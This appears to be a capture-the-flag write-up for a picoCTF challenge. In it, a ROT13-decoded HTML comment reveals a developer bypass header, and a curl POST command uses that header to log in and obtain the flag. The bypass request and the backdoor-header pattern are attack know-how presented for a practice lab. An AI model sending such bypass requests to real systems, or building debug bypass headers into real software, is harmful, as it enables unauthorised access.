# URL
https://play.picoctf.org/practice/challenge/520
# Concept
* debug HTTP header
# Method of solve
* there's a ROT13 encoded message in the HTTP comments on the login page
* when translated, the message looks like this: `NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"`
* this indicates that we should include this header when we try to login
* the app JavaScript code let us know what the format of the login POST request should look like:
```
<script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const formData = {
                email: document.getElementById('email').value,
                password: document.getElementById('password').value
            };

            fetch('/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(formData)
            })
            .then(response => response.json())
            .then(data => {
                console.log(data);
                if (data.success) {
    prompt('Login successful!\nFlag:', data.flag);
} else {
    alert('Invalid credentials');
}

            })
            .catch(error => console.error('Error:', error));
        });
    </script>
```
* this lets us know it's looking for JSON data, and the key/values its looking for
* we can create the request in curl, and the command looks like this:
```
curl -v -X POST -H "X-Dev-Access: yes" -H "Content-Type: application/json" -d '{"email": "ctf-player@picoctf.org", "password": "test"}' http://amiable-citadel.picoctf.net:52911/login
```


